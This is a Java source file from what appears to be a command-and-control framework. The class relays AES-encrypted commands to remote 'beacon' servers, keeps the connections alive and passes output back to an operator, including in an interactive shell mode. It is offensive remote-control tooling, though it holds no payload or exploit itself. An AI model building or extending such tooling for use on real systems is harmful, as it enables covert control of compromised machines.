package Servers.C2;

import java.io.IOException;

import Servers.Duplexer;
import Servers.keepAlive;
import Servers.encryption.aes.*;

public class C2ServerBeaconHandler implements Runnable{
    // IP address of the Long Range Becaon that this thread is handling
    public String IP;

    // Duplexer send and receive from the Long Range Beacon
    private Duplexer duplexer;

    // Pointer to the C2 Server
    private C2Server C2server;

    // Class and Thread that send a KEEP_ALIVE Messsage to the Beacon Server every 30 seconds to keep the socket open
    private keepAlive keepAliveClass;
    private Thread keepAliveThread;
    private Object sendLock;

    // Variables used when the user is in shell mode
    private Boolean isShell;
    private Object shellLock;

    // Object used to encrypt with AES
    private aes aes;

    /**
     * Class used to create a new thread, to handle messages coming from an individual beacon to the C2 server
     * 
     * @param duplexer - duplexer used to write and read from the socket
     * @param IP - IP address of the beacon
     * @param server - pointer back to the C2 server
     * @param shellLock - Object lock, used to make responses in shell mode come back very quickly
     * @param aes - object used for encryption and decryption via aes
     */
    protected C2ServerBeaconHandler(Duplexer duplexer, String IP, C2Server server, Object shellLock, aes aes){
        this.duplexer = duplexer;
        this.IP = IP;
        this.C2server = server;
        this.sendLock = new Object();
        this.keepAliveClass = new keepAlive(duplexer, sendLock, true, false, aes);
        this.keepAliveThread = new Thread(keepAliveClass);
        this.isShell = false;
        this.shellLock = shellLock;
        this.aes = aes;
    }

    protected void setIsShell(Boolean value){
        this.isShell = value;
    }

    /**
     * Sends a message to the Long Range Beacon Server from the C2 Server
     * 
     * @param message
     */
    protected void sendToBeacon(String message){
        synchronized(sendLock){
            duplexer.send(aes.encrypt(message), true);
        }
    }

    @Override
    public void run() {
        Boolean notify;
        try {
            boolean sentinel = true;
            keepAliveThread.start();
            while(sentinel){
                notify = false;
                String response = aes.decrypt(duplexer.receive(true));
                if(!(response.equals("KEEP_ALIVE"))){
                    if(response.contains("END_OF_OUTPUT")){
                        notify = true;
                        response = response.substring(0, response.indexOf("END_OF_OUTPUT"));
                    }
                    C2server.outputToUserHandler(response);
                    if(notify && isShell){
                        synchronized(shellLock){
                            shellLock.notify();
                        }
                    }
                }   
            }
        } catch (IOException e) {
            String errorMessage = "Lost Beacon Server at " + IP;
            C2server.outputToUserHandler(errorMessage);
            keepAliveClass.stopKeepAlive();
        } catch (NullPointerException e) {
            String errorMessage = "Lost Beacon Server at " + IP;
            C2server.outputToUserHandler(errorMessage);
            keepAliveClass.stopKeepAlive();
        } catch (NumberFormatException e){
            String errorMessage = "Lost Beacon Server at " + IP;
            C2server.outputToUserHandler(errorMessage);
            keepAliveClass.stopKeepAlive();
        }
    }
}
